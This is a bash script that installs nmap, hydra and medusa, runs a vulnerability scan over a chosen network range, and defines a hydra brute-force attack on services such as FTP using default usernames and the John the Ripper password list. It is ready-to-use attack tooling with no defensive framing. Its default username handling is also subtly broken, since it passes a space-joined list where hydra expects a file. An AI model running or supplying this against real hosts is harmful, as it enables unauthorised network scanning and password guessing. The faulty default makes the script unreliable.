#!/bin/bash

# Update and Upgrade System silently
echo "Updating and upgrading system packages. Please wait..."
sudo apt update &> /dev/null && sudo apt upgrade -y &> /dev/null
echo "System updated and upgraded successfully."

# Check for and Install Necessary Tools silently
for tool in nmap hydra medusa; do
    if ! command -v $tool &> /dev/null; then
        echo "Installing $tool..."
        sudo apt install $tool -y &> /dev/null
        echo "$tool installed successfully."
    else
        echo "$tool is already installed."
    fi
done

echo "Enter the network range for scanning (e.g., 192.168.1.0/24):"
read network_range

echo "Choose scan type (basic/full):"
read scan_type

echo "Enter a name for the output directory:"
read output_dir

mkdir -p "$output_dir"  # Create the directory if it doesn't exist
output_file="$output_dir/scan_results.txt"

if [ "$scan_type" == "basic" ]; then
    echo "Performing basic scan on $network_range..."
    sudo nmap -sV $network_range -oN $output_file
elif [ "$scan_type" == "full" ]; then
    echo "Performing full scan on $network_range..."
    sudo nmap -sV --script=vuln -T4 $network_range -oN $output_file
else
    echo "Invalid scan type selected. Exiting."
    exit 1
fi

echo "Scan complete. Results saved to $output_file."

# Function for Brute Force Attack
perform_brute_force() {
    local service=$1
    local ip=$2
    local user_list=$3
    local pass_list=$4

    echo "Performing brute force attack on $service at $ip..."
    hydra -L $user_list -P $pass_list $service://$ip
}

# Common usernames for FTP
usernames=("admin" "user" "ftp" "anonymous" "guest")
default_passlist="/usr/share/john/password.lst" # Default password list path

# User options for custom lists
read -p "Enter custom username list path (or press enter to use default usernames): " custom_userlist
read -p "Enter custom password list path (or press enter to use default John the Ripper list): " custom_passlist

userlist=${custom_userlist:-${usernames[*]}}
passlist=${custom_passlist:-$default_passlist}

# Example usage of brute force function (assuming FTP service and an IP address)
# perform_brute_force "ftp" "192.168.32.135" "$userlist" "$passlist"